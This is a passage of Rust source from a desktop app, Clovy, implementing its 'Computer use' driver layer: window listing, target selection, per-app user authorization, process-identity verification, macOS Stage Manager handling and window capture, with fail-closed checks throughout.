            "Computer use was stopped before the action ran.",
        ));
    }
    Ok(())
}

#[derive(Debug, Clone)]
struct WindowTarget {
    pid: i64,
    window_id: u64,
    app_name: String,
    identity: AppIdentity,
    native_owner: Option<NativeOwnerIdentity>,
    title: String,
    z_index: i64,
    x: f64,
    y: f64,
    width: f64,
    height: f64,
    is_on_screen: bool,
    on_current_space: Option<bool>,
}

async fn windows(
    app: &AppHandle,
    state: &ComputerUseState,
    expected_epoch: Option<u64>,
) -> Result<Vec<WindowTarget>, AppError> {
    let result = driver_call(
        app,
        state,
        "list_windows",
        json!({ "on_screen_only": false }),
        expected_epoch,
    )
    .await?;
    ensure_epoch_current(state, expected_epoch)?;
    let values = structured(&result)
        .and_then(|value| value.get("windows"))
        .and_then(Value::as_array)
        .ok_or_else(|| {
            AppError::new(
                "computer_use_windows_unavailable",
                "The Computer use driver did not return a window list.",
            )
        })?;
    let mut windows: Vec<WindowTarget> = values
        .iter()
        .filter_map(|window| {
            let pid = window.get("pid")?.as_i64()?;
            let native_owner = match window.get("native_owner") {
                Some(value) if !value.is_null() => {
                    let owner: NativeOwnerIdentity = serde_json::from_value(value.clone()).ok()?;
                    if owner.pid == 0 || owner.instance.is_empty() {
                        return None;
                    }
                    Some(owner)
                }
                _ if cfg!(target_os = "windows") => return None,
                _ => None,
            };
            Some(WindowTarget {
                pid,
                native_owner,
                window_id: window.get("window_id")?.as_u64()?,
                app_name: window.get("app_name")?.as_str()?.to_string(),
                // WindowServer's owner name is presentation text and can be
                // localized or spoofed. Resolve a stable bundle/executable
                // identity from the owning pid and fail closed if unavailable.
                identity: app_identity(pid)?,
                title: window
                    .get("title")
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_string(),
                z_index: window
                    .get("z_index")
                    .and_then(Value::as_i64)
                    .unwrap_or(i64::MAX),
                // Bounds are guaranteed by the pinned helper schema; treat a
                // missing field as drift and drop the window (fail closed, as
                // with identity above) rather than defaulting the origin to
                // (0, 0) and silently misplacing the cursor overlay.
                x: window.pointer("/bounds/x").and_then(Value::as_f64)?,
                y: window.pointer("/bounds/y").and_then(Value::as_f64)?,
                width: window.pointer("/bounds/width").and_then(Value::as_f64)?,
                height: window.pointer("/bounds/height").and_then(Value::as_f64)?,
                is_on_screen: window
                    .get("is_on_screen")
                    .and_then(Value::as_bool)
                    .unwrap_or(false),
                on_current_space: window.get("on_current_space").and_then(Value::as_bool),
            })
        })
        .collect();
    windows.sort_by_key(|window| window.z_index);
    Ok(collapse_stage_manager_shelf_surfaces(windows))
}

fn is_stage_manager_shelf_surface(window: &WindowTarget) -> bool {
    cfg!(not(target_os = "windows"))
        && window.is_on_screen
        && window.width < 160.0
        && window.height < 160.0
}

/// Stage Manager can publish both the real hidden app window and a small,
/// titled shelf proxy owned by the same process. The proxy is not an AX window
/// and therefore cannot be captured or raised by its CGWindowID. Keep the real
/// window as the sole candidate whenever that pair is present.
fn collapse_stage_manager_shelf_surfaces(windows: Vec<WindowTarget>) -> Vec<WindowTarget> {
    windows
        .iter()
        .filter(|candidate| {
            !is_stage_manager_shelf_surface(candidate)
                || !windows.iter().any(|underlying| {
                    underlying.window_id != candidate.window_id
                        && underlying.pid == candidate.pid
                        && underlying.identity == candidate.identity
                        && !underlying.is_on_screen
                        && underlying.width >= 160.0
                        && underlying.height >= 160.0
                })
        })
        .cloned()
        .collect()
}

fn window_needs_restore(window: &WindowTarget) -> bool {
    !window.is_on_screen
        || is_stage_manager_shelf_surface(window)
        || window.on_current_space == Some(false)
}

fn select_window(
    state: &ComputerUseState,
    windows: &[WindowTarget],
    app_filter: Option<&str>,
    window_id: Option<u64>,
) -> Result<WindowTarget, AppError> {
    let filter = app_filter.map(str::trim).filter(|value| !value.is_empty());
    let selected = if let Some(window_id) = window_id {
        let selected = windows
            .iter()
            .find(|window| window.window_id == window_id)
            .cloned()
            .ok_or_else(|| {
                AppError::new(
                    "computer_use_target_missing",
                    "That app window is no longer available. Call list_apps and choose an open window.",
                )
            })?;
        if filter.is_some_and(|filter| !selected.app_name.eq_ignore_ascii_case(filter)) {
            return Err(AppError::new(
                "computer_use_target_mismatch",
                "The supplied app does not own the selected window. Call list_apps and choose one exact target.",
            ));
        }
        selected
    } else {
        let filter = filter.ok_or_else(|| {
            AppError::new(
                "computer_use_target_required",
                "Choose an app or exact window from list_apps before capturing it.",
            )
        })?;
        unique_window_match(windows, filter)?
    };
    if blocked_target(state, &selected.app_name, &selected.identity) {
        return Err(AppError::new(
            "computer_use_target_blocked",
            format!(
                "Clovy cannot operate {} with Computer use.",
                selected.app_name
            ),
        ));
    }
    Ok(selected)
}

async fn refresh_window_target(
    app: &AppHandle,
    state: &ComputerUseState,
    target: &WindowTarget,
    epoch: u64,
) -> Result<WindowTarget, AppError> {
    windows(app, state, Some(epoch))
        .await?
        .into_iter()
        .find(|window| {
            window.pid == target.pid
                && window.window_id == target.window_id
                && window.identity == target.identity
                && window.native_owner == target.native_owner
                && !blocked_target(state, &window.app_name, &window.identity)
        })
        .ok_or_else(stale_target_error)
}

#[cfg(target_os = "macos")]
fn computer_use_stage_companion_behavior(
    current: objc2_app_kit::NSWindowCollectionBehavior,
) -> objc2_app_kit::NSWindowCollectionBehavior {
    use objc2_app_kit::NSWindowCollectionBehavior;

    let mutually_exclusive = NSWindowCollectionBehavior::MoveToActiveSpace
        | NSWindowCollectionBehavior::Primary
        | NSWindowCollectionBehavior::Auxiliary
        | NSWindowCollectionBehavior::CanJoinAllApplications;
    (current & !mutually_exclusive)
        | NSWindowCollectionBehavior::CanJoinAllSpaces
        | NSWindowCollectionBehavior::CanJoinAllApplications
}

fn native_stage_join_verified(result: &Value) -> bool {
    structured(result).is_some_and(|details| {
        let activated = details
            .get("activated_application")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        let focused = details
            .get("focused_without_space_follow")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        let raised = details
            .get("raised_with_accessibility")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        activated || (focused && raised)
    })
}

#[cfg(target_os = "macos")]
async fn set_clovy_stage_companion(app: &AppHandle, enabled: bool) -> Result<(), AppError> {
    use objc2_app_kit::{NSWindow, NSWindowCollectionBehavior};

    let main = app.get_webview_window("main").ok_or_else(|| {
        AppError::new(
            "computer_use_window_restore_failed",
            "Clovy's main window is not available for the Computer use task.",
        )
    })?;
    let handle = main.ns_window().map_err(|error| {
        AppError::new(
            "computer_use_window_restore_failed",
            format!("Clovy could not prepare its window for Computer use. {error}"),
        )
    })?;
    if handle.is_null() {
        return Err(AppError::new(
            "computer_use_window_restore_failed",
            "Clovy could not prepare its window for Computer use.",
        ));
    }

    let window = handle as usize;
    let (sender, receiver) = oneshot::channel();
    let epoch = app.state::<ComputerUseState>().current_epoch();
    let owner = app.clone();
    app.run_on_main_thread(move || {
        if enabled && owner.state::<ComputerUseState>().current_epoch() != epoch {
            let _ = sender.send(());
            return;
        }
        let window = unsafe { &*(window as *const NSWindow) };
        if enabled {
            let current = window.collectionBehavior();
            let _ = MAIN_WINDOW_ORIGINAL_COLLECTION_BEHAVIOR.compare_exchange(
                usize::MAX,
                current.0,
                Ordering::SeqCst,
                Ordering::SeqCst,
            );
            window.setCollectionBehavior(computer_use_stage_companion_behavior(current));
        } else {
            let original =
                MAIN_WINDOW_ORIGINAL_COLLECTION_BEHAVIOR.swap(usize::MAX, Ordering::SeqCst);
            if original != usize::MAX {
                window.setCollectionBehavior(NSWindowCollectionBehavior(original));
            }
        }
        let _ = sender.send(());
    })
    .map_err(|error| {
        AppError::new(
            "computer_use_window_restore_failed",
            format!("Clovy could not prepare its window for Computer use. {error}"),
        )
    })?;
    tokio::time::timeout(Duration::from_secs(1), receiver)
        .await
        .map_err(|_| {
            AppError::new(
                "computer_use_window_restore_failed",
                "Clovy could not prepare its window for Computer use.",
            )
        })?
        .map_err(|_| {
            AppError::new(
                "computer_use_window_restore_failed",
                "Clovy could not prepare its window for Computer use.",
            )
        })?;
    Ok(())
}

#[cfg(not(target_os = "macos"))]
async fn set_clovy_stage_companion(_app: &AppHandle, _enabled: bool) -> Result<(), AppError> {
    Ok(())
}

async fn join_target_to_clovy_stage(
    app: &AppHandle,
    state: &ComputerUseState,
    target: &WindowTarget,
    epoch: u64,
    task_generation: u64,
) -> Result<WindowTarget, AppError> {
    ensure_epoch_current(state, Some(epoch))?;
    ensure_attended_run(state)?;
    ensure_task_generation_current(state, task_generation)?;
    crate::main_window::show(app);
    set_clovy_stage_companion(app, true).await?;
    tokio::time::sleep(Duration::from_millis(250)).await;
    ensure_task_generation_current(state, task_generation)?;
    // The target can change while the companion window settles. Recheck the
    // exact PID, window and process identity before the driver can activate it.
    let target = refresh_window_target(app, state, target, epoch).await?;
    ensure_task_generation_current(state, task_generation)?;
    let action_id = random_id();
    let stage_join_result = driver_call(
        app,
        state,
        "join_current_stage",
        json!({ "pid": target.pid, "window_id": target.window_id }),
        Some(epoch),
    )
    .await
    .map_err(|error| action_delivery_unknown(error, &action_id))?;
    async {
        // The driver activates the target while Clovy's main window is an AppKit
        // Stage Manager companion. WindowManager can therefore show both apps in
        // the active set without a cursor-moving shelf click. Keep the wait bounded
        // while WindowServer finishes the transition and verify the exact window.
        let native_verified = native_stage_join_verified(&stage_join_result);
        let mut last_seen = target.clone();
        for _ in 0..if native_verified { 2 } else { 4 } {
            tokio::time::sleep(Duration::from_millis(250)).await;
            ensure_task_generation_current(state, task_generation)?;
            let restored = refresh_window_target(app, state, &target, epoch).await?;
            if !window_needs_restore(&restored) {
                return Ok(restored);
            }
            last_seen = restored;
        }
        // Screen-sharing privacy overlays can make WindowServer keep reporting the
        // exact window as off-screen after AppKit accepted application activation.
        // Treat that activation as authoritative; if it is unavailable, require
        // both exact-window SkyLight focus and Accessibility raise. Combined with
        // Clovy's companion collection behavior, either proof avoids turning a
        // successful stage change into a slow false failure.
        if native_verified {
            last_seen.is_on_screen = true;
            last_seen.on_current_space = Some(true);
            return Ok(last_seen);
        }
        Err(AppError::new(
            "computer_use_window_restore_failed",
            "Clovy could not add that app window to the current Stage Manager group. Do not retry this window during the current task.",
        ))
    }
    .await
    .map_err(|error| action_delivered_unverified(error, &action_id))
}

#[cfg(target_os = "macos")]
fn app_identity(pid: i64) -> Option<AppIdentity> {
    let pid = libc::pid_t::try_from(pid).ok()?;
    let process_creation = crate::computer_use_macos::process_creation(u32::try_from(pid).ok()?)?;
    let running =
        objc2_app_kit::NSRunningApplication::runningApplicationWithProcessIdentifier(pid)?;
    if running.isTerminated() {
        return None;
    }
    let bundle_id = running.bundleIdentifier()?.to_string();
    if bundle_id.trim().is_empty() {
        return None;
    }
    let executable_path = process_executable_path(pid)?;
    if !executable_path.is_absolute() {
        return None;
    }
    if crate::computer_use_macos::process_creation(u32::try_from(pid).ok()?)? != process_creation {
        return None;
    }
    Some(AppIdentity {
        bundle_id,
        executable_path,
        process_creation,
    })
}

#[cfg(target_os = "windows")]
fn app_identity(pid: i64) -> Option<AppIdentity> {
    let identity = crate::computer_use_windows::process_identity(u32::try_from(pid).ok()?).ok()?;
    Some(AppIdentity {
        bundle_id: identity.path.file_name()?.to_string_lossy().to_lowercase(),
        executable_path: identity.path,
        process_creation: identity.creation_time,
    })
}

#[cfg(not(any(target_os = "macos", target_os = "windows")))]
fn app_identity(_pid: i64) -> Option<AppIdentity> {
    None
}

#[cfg(target_os = "macos")]
fn process_executable_path(pid: libc::pid_t) -> Option<PathBuf> {
    const PROC_PIDPATHINFO_MAXSIZE: usize = 4096;
    let mut buffer = vec![0u8; PROC_PIDPATHINFO_MAXSIZE];
    let length = unsafe {
        computer_use_proc_pidpath(
            pid,
            buffer.as_mut_ptr().cast(),
            u32::try_from(buffer.len()).ok()?,
        )
    };
    if length <= 0 {
        return None;
    }
    buffer.truncate(usize::try_from(length).ok()?);
    if buffer.last() == Some(&0) {
        buffer.pop();
    }
    String::from_utf8(buffer).ok().map(PathBuf::from)
}

#[cfg(target_os = "macos")]
#[link(name = "proc")]
unsafe extern "C" {
    #[link_name = "proc_pidpath"]
    fn computer_use_proc_pidpath(
        pid: libc::pid_t,
        buffer: *mut libc::c_void,
        buffersize: u32,
    ) -> libc::c_int;
}

fn unique_window_match(windows: &[WindowTarget], filter: &str) -> Result<WindowTarget, AppError> {
    let filter = filter.to_ascii_lowercase();
    let exact_title: Vec<_> = windows
        .iter()
        .filter(|window| window.title.to_ascii_lowercase() == filter)
        .cloned()
        .collect();
    if exact_title.len() == 1 {
        return Ok(exact_title[0].clone());
    }
    let exact_app: Vec<_> = windows
        .iter()
        .filter(|window| window.app_name.to_ascii_lowercase() == filter)
        .cloned()
        .collect();
    if exact_app.len() == 1 {
        return Ok(exact_app[0].clone());
    }
    let partial: Vec<_> = windows
        .iter()
        .filter(|window| {
            window.app_name.to_ascii_lowercase().contains(&filter)
                || window.title.to_ascii_lowercase().contains(&filter)
        })
        .cloned()
        .collect();
    match partial.as_slice() {
        [window] => Ok(window.clone()),
        [] => Err(AppError::new(
            "computer_use_target_missing",
            "No matching app window is available. Call list_apps and choose an open window.",
        )),
        _ => Err(AppError::new(
            "computer_use_target_ambiguous",
            "More than one app window matches. Call list_apps and pass an exact window_id.",
        )),
    }
}

fn optional_window_id(arguments: &Value) -> Result<Option<u64>, AppError> {
    match arguments.get("window_id") {
        None => Ok(None),
        Some(value) => value.as_u64().map(Some).ok_or_else(|| {
            AppError::new(
                "computer_use_window_invalid",
                "Computer use window_id must be a non-negative integer from list_apps.",
            )
        }),
    }
}

async fn capture(
    app: &AppHandle,
    state: &ComputerUseState,
    arguments: &Value,
    expected_epoch: Option<u64>,
    task_generation: u64,
) -> Result<Value, AppError> {
    let epoch = expected_epoch.unwrap_or_else(|| state.epoch.load(Ordering::SeqCst));
    let windows = windows(app, state, expected_epoch).await?;
    let mut target = select_window(
        state,
        &windows,
        arguments.get("app").and_then(Value::as_str),
        optional_window_id(arguments)?,
    )?;
    ensure_app_authorized(
        app,
        state,
        identity_app_authorization(&target.identity),
        &target.app_name,
        epoch,
        task_generation,
    )
    .await?;
    target = refresh_window_target(app, state, &target, epoch).await?;
    if window_needs_restore(&target) {
        target = join_target_to_clovy_stage(app, state, &target, epoch, task_generation).await?;
    }
    ensure_task_generation_current(state, task_generation)?;
    let mode = arguments
        .get("mode")
        .and_then(Value::as_str)
        .unwrap_or("som");
    if !matches!(mode, "som" | "vision" | "ax") {
        return Err(AppError::new(
            "computer_use_capture_mode_invalid",
            "Capture mode must be som, vision, or ax.",
        ));
    }
    let max_elements = arguments
        .get("max_elements")
        .and_then(Value::as_u64)
        .map(|value| value as usize)
        .unwrap_or(DEFAULT_MAX_ELEMENTS)
        .clamp(1, MAX_ELEMENTS);
    let result = driver_call(
        app,
        state,
        "get_window_state",
        json!({
            "pid": target.pid,
            "window_id": target.window_id,
            "capture_mode": mode,
        }),
        expected_epoch,
    )
    .await?;
    ensure_epoch_current(state, expected_epoch)?;
    let tree = structured(&result)
        .and_then(|value| value.get("tree_markdown"))
        .and_then(Value::as_str)
        .unwrap_or("");
    let elements = parse_elements(tree, max_elements);
    let capture_sha256 = capture_sha256(&result)?;
    ensure_epoch_current(state, expected_epoch)?;
    let capture_path = save_capture(app, &result)?;
    if let Err(error) = ensure_epoch_current(state, expected_epoch) {
        remove_capture(capture_path.as_deref());
        return Err(error);
    }
    let generation = state.capture_generation.fetch_add(1, Ordering::SeqCst) + 1;
    let context = TargetContext {
        pid: target.pid,
        window_id: target.window_id,
        app_name: target.app_name.clone(),
        identity: target.identity.clone(),
        native_owner: target.native_owner.clone(),
        elements,
        capture_path: capture_path.clone(),
        capture_sha256,
        capture_generation: generation,
        bounds: crate::computer_use_cursor::ScreenRect {
            x: target.x,
            y: target.y,
            width: target.width,
            height: target.height,
        },
    };
    let previous_capture = match (|| -> Result<Option<String>, AppError> {
        let mut current = state
            .target
            .lock()
            .map_err(|_| AppError::new("computer_use_unavailable", "Target lock failed."))?;
        ensure_epoch_current(state, expected_epoch)?;
        Ok(current
            .replace(context)
            .and_then(|previous| previous.capture_path))
    })() {
        Ok(previous) => previous,
        Err(error) => {
            remove_capture(capture_path.as_deref());
            return Err(error);
        }
    };
    if let Err(error) = ensure_epoch_current(state, expected_epoch) {
        remove_capture(capture_path.as_deref());
        if let Ok(mut current) = state.target.lock() {
            if current
                .as_ref()
                .is_some_and(|target| target.capture_generation == generation)
            {
                *current = None;
            }
        }
        return Err(error);
    }
    if previous_capture.as_deref() != capture_path.as_deref() {
        if let Some(previous_capture) = previous_capture {
            let _ = std::fs::remove_file(previous_capture);
        }
    }
    Ok(sanitize_capture_result(
        result,
        &target.app_name,
        capture_path.as_deref(),
        max_elements,
    ))
}

async fn list_apps(
    app: &AppHandle,
    state: &ComputerUseState,
    expected_epoch: Option<u64>,
) -> Result<Value, AppError> {
    let windows = windows(app, state, expected_epoch).await?;
    let mut seen = HashSet::new();
    let mut apps = Vec::new();
    let mut available_windows = Vec::new();
    for window in windows
        .into_iter()
        .filter(|window| !blocked_target(state, &window.app_name, &window.identity))
    {
        if seen.insert(window.app_name.to_ascii_lowercase()) {
            apps.push(json!({ "name": window.app_name.clone(), "pid": window.pid }));
        }
        available_windows.push(json!({
            "name": window.app_name.clone(),
            "pid": window.pid,
            "window_id": window.window_id,
            "title": sanitize_line(&window.title),
            "bounds": {
                "x": window.x,
                "y": window.y,
                "width": window.width,
                "height": window.height,
            },
            "is_on_screen": window.is_on_screen,
            "on_current_space": window.on_current_space,
            "needs_restore": window_needs_restore(&window),
        }));
    }
    let app_count = apps.len();
    let window_count = available_windows.len();
    Ok(mcp_text(json!({
        "apps": apps,
        "count": app_count,
        "windows": available_windows,
        "window_count": window_count,
    })))
}

fn open_app_name(arguments: &Value) -> Result<String, AppError> {
    let name = arguments
        .get("app")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|name| !name.is_empty())
        .ok_or_else(|| {
            AppError::new(
                "computer_use_app_required",
                "open_app requires an installed app display name.",
            )
        })?;
    if name.chars().count() > 200
        || name.chars().any(char::is_control)
        || name
            .chars()
            .any(|character| matches!(character, '/' | '\\' | ':'))
    {
        return Err(AppError::new(
            "computer_use_app_invalid",
            "open_app accepts an installed app display name, not a path or URL.",
        ));
    }
    if blocked_app(name) {
        return Err(AppError::new(
            "computer_use_target_blocked",
            format!("Clovy cannot open {name} with Computer use."),
        ));
    }
    Ok(name.to_string())
}

fn requested_app_authorization(name: &str) -> AppAuthorizationKey {
    AppAuthorizationKey::RequestedName(name.trim().to_lowercase())
}

fn identity_app_authorization(identity: &AppIdentity) -> AppAuthorizationKey {
    AppAuthorizationKey::Identity(identity.clone())
}

fn remember_app_authorization(
    state: &ComputerUseState,
    key: AppAuthorizationKey,
) -> Result<(), AppError> {
    state
        .authorized_apps
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "App authorization lock failed."))?
        .insert(key);
    Ok(())
}

fn app_is_authorized(
    state: &ComputerUseState,
    key: &AppAuthorizationKey,
) -> Result<bool, AppError> {
    Ok(state
        .authorized_apps
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "App authorization lock failed."))?
        .contains(key))
}

fn authorized_running_identity_for_name(
    state: &ComputerUseState,
    windows: &[WindowTarget],
    requested_name: &str,
) -> Result<Option<AppIdentity>, AppError> {
    let requested_name = requested_name.trim();
    let authorized_apps = state
        .authorized_apps
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "App authorization lock failed."))?;
    let mut matches = windows
        .iter()
        .filter(|window| window.app_name.eq_ignore_ascii_case(requested_name))
        .map(|window| window.identity.clone());
    let first = matches.next();
    if first
        .as_ref()
        .is_some_and(|identity| matches.any(|candidate| candidate != *identity))
    {
        return Ok(None);
    }
    Ok(first.filter(|identity| authorized_apps.contains(&identity_app_authorization(identity))))
}

async fn ensure_app_authorized(
    app: &AppHandle,
    state: &ComputerUseState,
    key: AppAuthorizationKey,
    target_app: &str,
    epoch: u64,
    task_generation: u64,
) -> Result<bool, AppError> {
    ensure_task_generation_current(state, task_generation)?;
    if app_is_authorized(state, &key)? {
        return Ok(false);
    }
    park_app_authorization(app, state, target_app).await?;
    recheck_after_approval(app, state, epoch, task_generation).await?;
    remember_app_authorization(state, key.clone())?;
    if let Err(error) = ensure_task_generation_current(state, task_generation) {
        if let Ok(mut authorized_apps) = state.authorized_apps.lock() {
            authorized_apps.remove(&key);
        }
        return Err(error);
    }
    Ok(true)
}

fn store_target_selection(
    state: &ComputerUseState,
    target: &WindowTarget,
    epoch: u64,
    task_generation: u64,
) -> Result<(), AppError> {
    let previous_capture = {
        let mut current = state
            .target
            .lock()
            .map_err(|_| AppError::new("computer_use_unavailable", "Target lock failed."))?;
        ensure_epoch_current(state, Some(epoch))?;
        ensure_task_generation_current(state, task_generation)?;
        current
            .replace(TargetContext {
                pid: target.pid,
                window_id: target.window_id,
                app_name: target.app_name.clone(),
                identity: target.identity.clone(),
                native_owner: target.native_owner.clone(),
                elements: HashMap::new(),
                capture_path: None,
                capture_sha256: None,
                capture_generation: state.capture_generation.load(Ordering::SeqCst),
                bounds: crate::computer_use_cursor::ScreenRect {
                    x: target.x,
                    y: target.y,
                    width: target.width,
                    height: target.height,
                },
            })
            .and_then(|previous| previous.capture_path)
    };
    if let Some(previous_capture) = previous_capture {
        let _ = std::fs::remove_file(previous_capture);
    }
    Ok(())
}

async fn open_app(
    app: &AppHandle,
    state: &ComputerUseState,
    arguments: &Value,
    epoch: u64,
    task_generation: u64,
) -> Result<Value, AppError> {
    let requested_name = open_app_name(arguments)?;
    let requested_key = requested_app_authorization(&requested_name);
    let requested_name_authorized = app_is_authorized(state, &requested_key)?;
    let running_authorized_identity = if requested_name_authorized {
        None
    } else {
        let available = windows(app, state, Some(epoch)).await?;
        authorized_running_identity_for_name(state, &available, &requested_name)?
    };
    let authorized_by_name = if running_authorized_identity.is_some() {
        false
    } else {
        ensure_app_authorized(
            app,
            state,
            requested_key,
            &requested_name,
            epoch,
            task_generation,
        )
        .await?;
        true
    };
    ensure_task_generation_current(state, task_generation)?;
    let action_id = random_id();
    let result = driver_call(
        app,
        state,
        "launch_app",
        json!({ "name": requested_name }),
        Some(epoch),
    )
    .await
    .map_err(|error| action_delivery_unknown(error, &action_id))?;
    async {
        let launched = structured(&result).ok_or_else(|| {
            AppError::new(
                "computer_use_driver_invalid_response",
                "The Computer use driver did not identify the opened app.",
            )
        })?;
        let (pid, identity) = verified_launched_identity(
            launched,
            cfg!(target_os = "macos"),
            app_identity,
        )?;
        let reported_name = launched
            .get("name")
            .and_then(Value::as_str)
            .filter(|name| !name.trim().is_empty() && *name != "?")
            .unwrap_or(&requested_name);
        if blocked_target(state, reported_name, &identity) {
            return Err(AppError::new(
                "computer_use_target_blocked",
                format!("Clovy cannot operate {reported_name} with Computer use."),
            ));
        }
        ensure_task_generation_current(state, task_generation)?;
        let identity_key = identity_app_authorization(&identity);
        if !app_is_authorized(state, &identity_key)? {
            if authorized_by_name || requested_name_authorized {
                remember_app_authorization(state, identity_key.clone())?;
            } else {
                // A previously approved running app was expected, but LaunchServices
                // resolved the display name to a different identity. Do not let the
                // display-name alias widen the user's approval to that other app.
                ensure_app_authorized(
                    app,
                    state,
                    identity_key.clone(),
                    reported_name,
                    epoch,
                    task_generation,
                )
                .await?;
            }
        }
        if let Err(error) = ensure_task_generation_current(state, task_generation) {
            if let Ok(mut authorized_apps) = state.authorized_apps.lock() {
                authorized_apps.remove(&identity_key);
            }
            return Err(error);
        }

        tokio::time::sleep(Duration::from_millis(250)).await;
        let matching: Vec<_> = windows(app, state, Some(epoch))
            .await?
            .into_iter()
            .filter(|window| {
                window.pid == pid
                    && window.identity == identity
                    && !blocked_target(state, &window.app_name, &window.identity)
            })
            .collect();
        let selected = matching
            .iter()
            .find(|window| !window_needs_restore(window))
            .or_else(|| matching.first())
            .cloned();
        let selected = match selected {
            Some(target) if window_needs_restore(&target) => {
                Some(join_target_to_clovy_stage(app, state, &target, epoch, task_generation).await?)
            }
            selected => selected,
        };
        if let Some(target) = selected.as_ref() {
            store_target_selection(state, target, epoch, task_generation)?;
        }
        let available_windows: Vec<_> = matching
            .iter()
            .map(|window| {
                let window = selected
                    .as_ref()
                    .filter(|selected| selected.window_id == window.window_id)
                    .unwrap_or(window);
                json!({
                    "window_id": window.window_id,
                    "title": sanitize_line(&window.title),
                    "bounds": {
                        "x": window.x,
                        "y": window.y,
                        "width": window.width,
                        "height": window.height,
                    },
                    "is_on_screen": window.is_on_screen,
                    "needs_restore": window_needs_restore(window),
                })
            })
            .collect();
        ensure_epoch_current(state, Some(epoch))?;
        ensure_task_generation_current(state, task_generation)?;
        Ok(mcp_text(json!({
            "ok": true,
            "action": "open_app",
            "action_id": action_id,
            "disposition": { "delivery": "delivered_unverified", "retry": "unsafe" },
            "target_app": selected.as_ref().map(|window| window.app_name.as_str()).unwrap_or(reported_name),
            "pid": pid,
            "window_id": selected.as_ref().map(|window| window.window_id),
            "windows": available_windows,
            "message": if selected.is_some() {
                "The app is ready in Clovy's current Stage Manager group. Capture the returned window before acting."
            } else {
                "The app opened, but no operable window appeared yet. Wait, then call list_apps."
            },
        })))
    }
    .await
    .map_err(|mut error| {
        let mut details = error.details.take().unwrap_or_else(|| json!({}));
        if !details.is_object() {
            details = json!({ "cause": details });
        }
        details["launchReceipt"] = result.clone();
        error.details = Some(details);
        action_delivered_unverified(error, &action_id)
    })
}

// A PID lookup can verify a native launch receipt, but cannot replace its
// authority. In particular, a reused PID must not turn a name approval for the
// launched process into a grant for its successor.
fn verified_launched_identity(
    launched: &Value,
    require_bundle_id: bool,
    lookup: impl FnOnce(i64) -> Option<AppIdentity>,
) -> Result<(i64, AppIdentity), AppError> {
    let unverified = || {
        AppError::new(
            "computer_use_target_unverified",
            "Clovy could not verify the opened app against its native launch identity. Inspect the app list before continuing.",
        )
    };
    let pid = launched["pid"]
        .as_i64()
        .filter(|pid| *pid > 0 && u32::try_from(*pid).is_ok())
        .ok_or_else(unverified)?;
    let expected_path = launched["executable_path"]
        .as_str()
        .map(PathBuf::from)
        .filter(|path| path.is_absolute())
        .ok_or_else(unverified)?;
    let expected_creation = launched["process_creation_time"]
        .as_u64()
        .filter(|creation| *creation > 0)
        .ok_or_else(unverified)?;
    let expected_bundle = launched["bundle_id"]
        .as_str()
        .filter(|bundle| !bundle.trim().is_empty());
    if require_bundle_id && expected_bundle.is_none() {
        return Err(unverified());
    }
    let current = lookup(pid).ok_or_else(unverified)?;
    if current.executable_path != expected_path
        || current.process_creation != expected_creation
        || expected_bundle.is_some_and(|bundle| current.bundle_id != bundle)
    {
        return Err(unverified());
    }
    Ok((pid, current))
}

async fn focus_app(
    app: &AppHandle,
    state: &ComputerUseState,
    arguments: &Value,
    epoch: u64,
    task_generation: u64,
) -> Result<Value, AppError> {
    let raise_window = arguments
        .get("raise_window")
        .and_then(Value::as_bool)
        .unwrap_or(false);
    let app_name = arguments
        .get("app")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|value| !value.is_empty());
    let window_id = optional_window_id(arguments)?;
    if app_name.is_none() && window_id.is_none() {
        return Err(AppError::new(
            "computer_use_target_required",
            "focus_app requires an app name or exact window_id from list_apps.",
        ));
    }
    let available_windows = windows(app, state, Some(epoch)).await?;
    let mut target = select_window(state, &available_windows, app_name, window_id)?;
    ensure_app_authorized(
        app,
        state,
        identity_app_authorization(&target.identity),
        &target.app_name,
        epoch,
        task_generation,
    )
    .await?;
    target = refresh_window_target(app, state, &target, epoch).await?;
    let joined_current_stage = raise_window || window_needs_restore(&target);
    let action_id = random_id();
    if joined_current_stage {
        target = join_target_to_clovy_stage(app, state, &target, epoch, task_generation).await?;
    }
    let selection = (|| {
        ensure_epoch_current(state, Some(epoch))?;
        ensure_task_generation_current(state, task_generation)?;
        store_target_selection(state, &target, epoch, task_generation)
    })();
    if joined_current_stage {
        selection.map_err(|error| action_delivered_unverified(error, &action_id))?;
    } else {
        selection?;
    }
    Ok(mcp_text(json!({
        "ok": true,
        "action": "focus_app",
        "action_id": action_id,
        "disposition": if joined_current_stage { Some(json!({ "delivery": "delivered_unverified", "retry": "unsafe" })) } else { None },
        "target_app": target.app_name,
        "window_id": target.window_id,
        "raised": joined_current_stage,
        "message": if joined_current_stage {
            "The window was added to Clovy's current Stage Manager group. Capture it before acting."
        } else {
            "Target selected without raising its window. Capture it before acting."
        },
    })))
}

async fn mutate(
    app: &AppHandle,
    state: &ComputerUseState,
    action: &str,
    arguments: &Value,
    epoch: u64,
    task_generation: u64,
) -> Result<Value, AppError> {
    let target = state
        .target
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Target lock failed."))?
        .clone()
        .ok_or_else(|| {
            AppError::new(
                "computer_use_capture_required",
                "Capture a specific allowed app before taking an action.",
            )
        })?;
    validate_sensitive_action(state, action, arguments, &target)?;
    // Normalize and validate the driver request before any first-use app
    // authorization. The approved app must not turn an invalid request into a
    // different fallback action.
    let (tool, driver_args) = driver_action(action, arguments, &target)?;
    let action_id = random_id();
    ensure_app_authorized(
        app,
        state,
        identity_app_authorization(&target.identity),
        &target.app_name,
        epoch,
        task_generation,
    )
    .await?;
    revalidate_target(app, state, action, arguments, &target, epoch).await?;
    ensure_epoch_current(state, Some(epoch))?;
    ensure_task_generation_current(state, task_generation)?;
    let mut result = driver_call(app, state, tool, driver_args, Some(epoch))
        .await
        .map_err(|error| action_delivery_unknown(error, &action_id))?;
    add_result_metadata(&mut result, &action_id, &target.app_name);
    if arguments
        .get("capture_after")
        .and_then(Value::as_bool)
        .unwrap_or(false)
    {
        let capture_result = capture(
            app,
            state,
            &json!({
                "action": "capture",
                "mode": "som",
                "app": target.app_name,
                "window_id": target.window_id,
            }),
            Some(epoch),
